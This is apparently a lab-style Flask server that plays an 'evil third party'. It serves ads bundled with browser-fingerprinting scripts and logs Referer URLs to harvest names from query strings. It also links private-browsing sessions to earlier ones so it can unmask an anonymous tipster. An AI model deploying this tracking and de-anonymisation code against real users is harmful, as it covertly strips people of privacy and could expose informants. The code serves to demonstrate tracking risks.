from flask import Flask, Markup, make_response, request, jsonify
from urllib.parse import parse_qs
import uuid
import datetime
app = Flask(__name__)

fingerprinter_file = open('./fingerprinter.js')
fingerprinter = fingerprinter_file.read()
fingerprinter_file.close()

fingerprint2_file = open('./libs/fingerprint2.min.js')
fingerprint2 = fingerprint2_file.read()
fingerprint2_file.close()

object_hash_file = open('./libs/object_hash.min.js')
object_hash = object_hash_file.read()
object_hash_file.close()

# in-memory "database"
url_tuples = []         # cookie_id url timestamp
fingerprint_tuples = [] # cookie_id fingerprint_hash timestamp


def create_advertisement(title):
    return Markup(f'''
        <html>
            <title>
                Non-Evil Advertisement
            </title>
            <body>
                <h1>{title}</h1>
                <script>{fingerprint2}</script>
                <script>{object_hash}</script>
                <script>{fingerprinter}</script>
            </body>
        </html>
    ''')


hacker_group_name = 'hackers_group'

@app.route('/')
def evil_third_party():
    '''
    This method is the main end-point of the evil third-party. Whenever a
    request is made for the embedable content of the evil third-party, it will
    go through this function.

    The first time a request is made to the evil third-party, the evil
    third-party will set a cookie with a unique random ID to identify the user's
    session.

    Thereafter, whenever a request is made to this evil third-party, it will
    save a tuple of the user's (cookie-id, URL) to track the user's history on
    the first-party site.

    In order to show the "Gotcha" message to W, we check if the URL matches the
    URL form submission scheme and change the response to a different document
    saying "Gotcha W, your name is _____"

    In any other case, this evil third-party will show a random advertisement to
    seem like the service isn't tracking the users
    '''

    # create the advertisement document
    response = make_response(create_advertisement('Free money'))
    response.headers.set('Content-Type', 'text/html')

    # ensure a cookie_id
    cookie_id = request.cookies.get('cookie_id')
    if not cookie_id:
        cookie_id = uuid.uuid4().hex
        response.set_cookie('cookie_id',  cookie_id)

    # grab URL from referer header
    url = request.headers.get('referer') or ''
    timestamp = datetime.datetime.now()

    if hacker_group_name in url:
        # want this to work in private mode so can't assume cookie

        # normal mode
        # 1. W goes to form site and submits name  |  we get cookie + url
        # 2. W's computer performs a fingerprint and uploads it with the previous cookie ID | cookie + fingerprint
        
        # private mode (first load)
        # 1. W goes to tip site, first call loads the third party and the same process as above happens but with a different cookie
        # 2. W's computer performs the fingerprint and resolves to the same fingerprint as before and also uploads it (private session cookie + fingerprint)
        
        # private mode (submission)
        # 1. W submits the tip with the hacker group name (which causes that branch to run)
        # 2. we have just cookie + URL

        #url_tuples = []         # cookie_id url timestamp
        #fingerprint_tuples = [] # cookie_id fingerprint_hash timestamp

        # grab the fingerprints that match the current cookie_id
        linked_fingerprint_tuples = filter(
            lambda fingerprint_tuple: fingerprint_tuple[0] == cookie_id,
            fingerprint_tuples
        )
        linked_fingerprints = list(map(
            lambda fingerprint_tuple: fingerprint_tuple[1],
            linked_fingerprint_tuples
        ))

        # grab the cookies that are linked to the fingerprints found above
        linked_cookie_tuples = filter(
            lambda fingerprint_tuple: fingerprint_tuple[1] in linked_fingerprints,
            fingerprint_tuples
        )
        linked_cookies = list(map(
            lambda fingerprint_tuple: fingerprint_tuple[0],
            linked_cookie_tuples
        ))

        # grab the urls that are linked to the cookies
        linked_url_tuples = filter(lambda url_tuple: url_tuple[0] in linked_cookies, url_tuples)
        linked_urls = list(map(lambda url_tuple: url_tuple[1], linked_url_tuples))

        def parse_url(url):
            split = url.split('?')
            if len(split) <= 1:
                return {}
            query_string = split[1]
            return parse_qs(query_string)
        parsed_urls = list(map(parse_url, linked_urls))

        combined_dict = {}

        for parsed_url in parsed_urls:
            for key, values in parsed_url.items():
                if key in combined_dict:
                    for value in values:
                        combined_dict[key].append(value)
                else:
                    combined_dict[key] = values

        first_names = combined_dict.get('first-name', [''])
        last_names = combined_dict.get('last-name', [''])
        
        first_name = first_names[0]
        last_name = last_names[0]

        response = make_response(create_advertisement(f'Gotcha, {first_name} {last_name}'))
        return response
        
    # this tuple will be used to track the user on the first-party site
    # and grab PII leaked from the URL
    url_tuple = (cookie_id, url, timestamp)
    url_tuples.append(url_tuple)

    return response

@app.route('/fingerprints', methods=['POST'])
def fingerprints():
    fingerprint = str(request.get_data())

    response = make_response()
    response.headers.set('Content-Type', 'text/html')

    # ensure a cookie_id
    cookie_id = request.cookies.get('cookie_id')
    if not cookie_id:
        cookie_id = uuid.uuid4().hex
        response.set_cookie('cookie_id',  cookie_id)

    timestamp = datetime.datetime.now()

    fingerprint_tuple = (cookie_id, fingerprint, timestamp)
    fingerprint_tuples.append(fingerprint_tuple)
    
    return response

@app.route('/reset')
def reset():
    fingerprint_tuples.clear()
    url_tuples.clear()
    return 'success'

@app.route('/url-tuples')
def get_url_tuples():
    return jsonify(url_tuples)

@app.route('/fingerprint-tuples')
def get_fingerprint_tuples():
    return jsonify(fingerprint_tuples)
